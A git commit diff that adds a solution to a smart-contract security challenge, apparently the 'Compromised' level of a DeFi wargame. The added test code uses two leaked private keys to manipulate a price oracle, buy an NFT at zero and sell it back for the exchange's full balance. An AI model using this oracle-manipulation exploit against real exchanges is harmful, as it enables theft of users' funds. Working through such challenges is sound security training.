4d63a872737d99f002f6794c2a10bbc0bf27dd40
vyongope <vaillantyomen@gmail.com>
2023-08-26 17:45:27 +0100

    Resolve  challenge (7)

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -53,6 +53,38 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        this.timeout(20000);
+        // Use strange response from web service server to get compromised private keys
+        // `https://codebeautify.org/` : use this online tool to convert bytes digits to string and base64 decode to private key
+        const compromisedPrivateKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const compromisedPrivateKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        
+        // Construct wallets from compromised private keys
+        const compromisedSource1 = new ethers.Wallet(compromisedPrivateKey1, ethers.provider);
+        const compromisedSource2 = new ethers.Wallet(compromisedPrivateKey2, ethers.provider);
+
+        // lower the price
+        await oracle.connect(compromisedSource1).postPrice("DVNFT", ethers.utils.parseEther("0"));
+        await oracle.connect(compromisedSource2).postPrice("DVNFT", ethers.utils.parseEther("0"));
+        
+        // buy one token at the lower price
+        const tx = await exchange.connect(player).buyOne({ value: ethers.utils.parseEther("0.01") });
+
+        // subscribe to `TokenBought` after buying the token
+        await exchange.on("TokenBought", async (buyer, tokenId, price) => {
+            // set the price equal to the exchange balance
+            await oracle.connect(compromisedSource1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+            await oracle.connect(compromisedSource2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+            
+            // sell one
+            await nftToken.connect(player).approve(exchange.address, tokenId);
+            await exchange.connect(player).sellOne(tokenId);
+            
+            // set the initial price
+            await oracle.connect(compromisedSource1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+            await oracle.connect(compromisedSource2).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        });
+        await tx.wait(2);
     });
 
     after(async function () {
